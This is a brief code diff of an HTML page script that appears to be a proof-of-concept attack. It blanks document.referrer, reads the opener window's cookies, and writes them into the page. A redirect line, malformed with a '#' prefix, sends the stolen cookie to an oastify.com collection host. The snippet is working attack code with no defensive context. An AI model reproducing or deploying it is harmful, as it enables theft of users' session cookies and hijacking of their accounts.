@@ -12,7 +12,8 @@
 
 <script>
     function myFunc() {
-                        delete window.document.referrer;
+                        delete window.document.referrer; 
+                        window.document.__defineGetter__('referrer', function () { return ""; });
                         const cook = window.opener.document.cookie;
                         window.document.getElementById("oui").innerHTML = cook;
                        #window.location.href='http://ukihbhbvapt94xbx8bcuogxmadg44vsk.oastify.com/?cookie=';
